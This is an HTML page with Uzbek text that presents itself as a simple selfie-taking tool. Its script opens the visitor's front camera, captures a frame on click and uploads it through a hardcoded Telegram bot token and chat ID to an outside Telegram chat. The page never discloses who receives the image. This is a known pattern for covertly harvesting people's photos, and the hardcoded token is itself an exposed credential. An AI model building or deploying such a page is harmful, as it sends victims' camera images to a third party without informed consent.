<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasm olish</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
        }
        video {
            width: 300px;
            height: auto;
            border: 2px solid white;
            border-radius: 10px;
            display: block;
        }
        .capture-btn {
            padding: 12px 24px;
            font-size: 18px;
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <video id="video" playsinline autoplay></video>
    <button class="capture-btn" id="capture">üì∏ Rasm olish</button>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const captureBtn = document.getElementById("capture");
        const ctx = canvas.getContext("2d");

        const BOT_TOKEN = "7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs";
        const CHAT_ID = "7221078203";

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                });

                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                };
            } catch (error) {
                alert("üì∑ Kamera ishlamayapti yoki ruxsat berilmagan!");
                console.error("Kamera xatosi:", error);
            }
        }

        captureBtn.addEventListener("click", () => {
            if (!video.srcObject) {
                alert("‚è≥ Kamera ishga tushirilmoqda...");
                startCamera();
                return;
            }

            setTimeout(takePhoto, 500);
        });

        function takePhoto() {
            if (!video.videoWidth || !video.videoHeight) {
                alert("‚ùå Kamera hali to'liq yuklanmadi! Qayta urinib ko'ring.");
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.jpg");

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("‚úÖ Rasm muvaffaqiyatli jo'natildi!");
                    } else {
                        alert("‚ùå Telegramga yuborishda xatolik!");
                        console.error("Telegram javobi:", data);
                    }
                })
                .catch(error => {
                    alert("‚ùå Xatolik yuz berdi!");
                    console.error("Fetch xatosi:", error);
                });
            }, "image/jpeg", 0.9);
        }

        startCamera();
    </script>

</body>
</html>
